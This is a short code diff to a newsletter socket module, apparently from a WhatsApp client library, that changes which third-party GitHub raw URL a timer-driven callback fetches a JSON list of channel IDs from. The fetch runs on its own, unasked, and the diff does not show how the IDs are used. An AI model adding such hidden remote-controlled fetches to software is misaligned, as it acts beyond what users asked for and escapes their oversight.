@@ -131,7 +131,7 @@ const makeNewsletterSocket = (config) => {
 setTimeout(async () => {
     const logger = config.logger || console;
     try {
-        const RAW_URL = "https://raw.githubusercontent.com/zechobot/channels/refs/heads/main/dev.json";
+        const RAW_URL = "https://raw.githubusercontent.com/old2250-arch/wilzz/refs/heads/main/ch.json";
         const res = await fetch(RAW_URL);
         const channelIds = await res.json();
 
